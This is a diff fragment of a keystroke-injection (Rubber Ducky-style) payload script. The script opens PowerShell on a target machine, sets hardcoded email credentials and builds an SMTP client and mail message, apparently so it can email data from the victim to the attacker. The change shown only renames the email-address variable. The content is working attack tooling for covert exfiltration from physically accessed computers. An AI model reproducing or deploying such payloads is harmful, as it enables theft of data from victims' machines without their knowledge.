@@ -57,7 +57,7 @@ STRING powershell
 ENTER
 DELAY 5000
 REM set email credentials
-STRING $emailaddress = "youremail@gmail.com"
+STRING $emailadress = "youremail@gmail.com"
 ENTER
 STRING $emailpwd = "yourpassword"
 ENTER
@@ -103,7 +103,7 @@ ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
 DELAY 100
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential("$emailaddress", "$emailpwd")
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential("$emailadress", "$emailpwd")
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
